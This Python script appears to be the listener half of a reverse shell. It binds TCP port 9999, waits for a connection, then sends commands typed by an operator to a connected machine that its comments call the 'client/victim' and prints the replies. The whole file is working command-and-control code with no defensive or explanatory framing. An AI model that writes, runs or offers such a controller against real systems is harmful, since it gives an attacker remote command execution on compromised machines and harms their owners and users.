import socket
import sys
import threading

#create an INET, STREAMing socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999 # Port to listen on (non-privileged ports are > 1023)
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg)) # Print error message

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port)) # Print port number

        s.bind((host, port)) # Bind to the port
        s.listen(5) # Listen up to 5 connections

    except socket.error as msg:
        print("Socket Binding error: " + str(msg) + "\n" + "Retrying...") # Print error message
        bind_socket() # Recursion

# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept() # Accept connection if there is any
    print("Connection has been established | " + "IP: " + address[0] + " | Port " + str(address[1])) # Print IP and port
    send_commands(conn) # Send commands
    conn.close() # Close connection

# Send commands to client/victim
def send_commands(conn):
    while True:
        cmd = input() # Take input
        if cmd == "quit": # If input is quit, close connection
            conn.close() # Closes connection
            s.close() # Closes socket
            sys.exit() # Exits program
        if len(str.encode(cmd)) > 0: # If there is a command
            conn.send(str.encode(cmd)) # Send command
            client_response = str(conn.recv(1024), "utf-8") # Receive response
            print(client_response, end="") # Print response

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
